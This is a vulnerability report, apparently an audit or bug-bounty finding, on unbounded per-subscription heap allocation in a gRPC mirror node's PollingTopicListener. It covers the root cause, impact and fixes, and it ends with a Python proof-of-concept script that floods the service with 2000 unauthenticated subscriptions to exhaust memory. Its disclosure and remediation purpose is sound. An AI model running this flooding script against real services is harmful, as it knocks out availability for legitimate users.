### Title
Unbounded Per-Subscription Heap Allocation in `PollingTopicListener.poll()` Enables Unauthenticated DoS via Subscription Flooding

### Summary
When `PollingTopicListener` is active (listener type `POLL`), every subscription with `limit=0` causes `poll()` to fetch up to `maxPageSize` (default 5000) rows from the database into JVM heap on every polling interval. There is no enforcement of a maximum concurrent subscription count — the `subscriberCount` gauge is metrics-only. An unauthenticated attacker opening thousands of concurrent subscriptions can exhaust JVM heap and crash the service.

### Finding Description

**Root cause — `poll()` lines 54–57:**

```java
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getCount().get())
        : Integer.MAX_VALUE;
int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
```

`hasLimit()` is defined as `return limit > 0` (`TopicMessageFilter.java` line 39). When a client sends `limit=0` (the protobuf default / "no limit"), `hasLimit()` returns `false`, so `limit` becomes `Integer.MAX_VALUE`, and `pageSize` resolves to `maxPageSize` = **5000** (the hardcoded default in `ListenerProperties.java` line 26).

Each subscription independently polls every `interval` (default 500 ms, `ListenerProperties.java` line 30) and materialises up to 5000 `TopicMessage` objects into heap via `Flux.fromStream(topicMessageRepository.findByFilter(newFilter))` (line 61).

**No subscription cap is enforced.** `TopicMessageServiceImpl` tracks `subscriberCount` (line 48) and exposes it as a Micrometer gauge (lines 52–55), but never checks or limits it before accepting a new subscription. The `doOnSubscribe` / `doFinally` hooks (lines 89–90) only increment/decrement the counter — there is no guard like `if (subscriberCount.get() >= MAX) return error`.

**No authentication.** No auth checks appear anywhere in the gRPC service layer.

**Exploit flow:**

1. Attacker opens N gRPC connections (HTTP/2 allows multiplexing; multiple TCP connections bypass per-connection stream limits).
2. Each connection issues `subscribeTopic` with `limit=0`, no `endTime`, a valid `topicId`, and a `startTime` in the past (so historical messages exist).
3. Every 500 ms, each of the N `PollingContext` instances independently calls `poll()`, issues a DB query capped at 5000 rows, and streams all results into heap.
4. Peak heap pressure: **N × 5000 × sizeof(TopicMessage)** bytes per polling cycle.
5. With N ≈ 1000 subscriptions and ~1 KB per message object, that is ~5 GB of live objects per cycle — well beyond typical JVM heap limits → `OutOfMemoryError` → service crash.

### Impact Explanation

Complete availability loss of the gRPC mirror node service. All legitimate subscribers are disconnected. Because the gRPC endpoint is network-accessible and unauthenticated, this is a remotely exploitable, zero-credential DoS. The crash is repeatable: the attacker can re-trigger it immediately after the service restarts.

### Likelihood Explanation

The attack requires only a gRPC client library (freely available) and knowledge of one valid `topicId` (publicly observable on-chain). No credentials, no special network position, and no prior state are needed. The only deployment precondition is that `hiero.mirror.grpc.listener.type=POLL` is configured — the default is `REDIS`, but `POLL` is a documented and supported mode. The attack is fully scriptable and repeatable.

### Recommendation

1. **Enforce a maximum concurrent subscription count.** In `TopicMessageServiceImpl.subscribeTopic()`, reject new subscriptions when `subscriberCount.get() >= configuredMax` before incrementing.
2. **Enforce a per-source-IP (or per-connection) subscription limit** at the Netty/gRPC interceptor layer.
3. **Cap `maxPageSize` more aggressively** and/or introduce back-pressure so a single slow consumer cannot hold 5000 objects in heap indefinitely.
4. **Add authentication/rate-limiting** at the gRPC server interceptor level so unauthenticated clients cannot open unbounded streams.
5. Consider switching the default and recommended mode to `SHARED_POLL` or `REDIS`, which share a single poll across all subscribers rather than one poll per subscriber.

### Proof of Concept

```python
import grpc
import threading
# proto-generated stubs for ConsensusService
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from com.hederahashgraph.api.proto.java import basic_types_pb2, timestamp_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_SHARD, TOPIC_REALM, TOPIC_NUM = 0, 0, 1  # any valid topic

def flood():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(shardNum=TOPIC_SHARD,
                                        realmNum=TOPIC_REALM,
                                        topicNum=TOPIC_NUM),
        # limit omitted → defaults to 0 → hasLimit()=false → pageSize=5000
        # consensusEndTime omitted → no endTime → subscription never terminates
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
    )
    for _ in stub.subscribeTopic(req):  # blocks, keeps subscription alive
        pass

threads = [threading.Thread(target=flood) for _ in range(2000)]
for t in threads:
    t.start()
# Each thread holds a live subscription; every 500ms the server fetches
# up to 5000 rows × 2000 subscriptions = 10,000,000 TopicMessage objects → OOM
```
